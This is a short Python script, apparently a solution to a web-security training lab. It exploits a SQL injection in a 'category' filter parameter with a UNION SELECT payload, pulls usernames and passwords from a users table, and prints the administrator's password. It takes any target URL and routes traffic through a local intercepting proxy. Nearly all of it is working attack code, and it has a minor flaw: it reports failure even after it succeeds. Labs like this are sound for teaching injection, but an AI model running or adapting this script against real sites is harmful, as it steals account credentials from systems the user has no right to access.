import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http": "127.0.0.1:8080","https": "127.0.0.1:8080" }



def database_dump(url):
    account='administrator'
    path = "filter?category=Tech+gifts"
    payload="' union select username,password from users--"
    req = requests.get(url+path+payload,verify=False,proxies=proxies)
    text=req.text
    if account in text:
        print("[+] Extracting the password of user administrator")
        soup = BeautifulSoup(text, 'html.parser')
        admin_th = soup.find('th', string='administrator')
        admin_td = admin_th.find_next_sibling('td')
        password = admin_td.text.strip()
        print(password)
        print("Administrator password is : %s"%password)




def main():
    try:
        print("[+] Checking for sql Injection ......")
        url=sys.argv[1]
    except IndexError:
        print("[+] Usage %s <url> "%sys.argv[0])
        print("[+] Example %s www.example.com "%sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the usernames and passwords from The database ........")
    if not database_dump(url):
        print("[-] Unable to dump the database. ")





if __name__=="__main__":
    main()
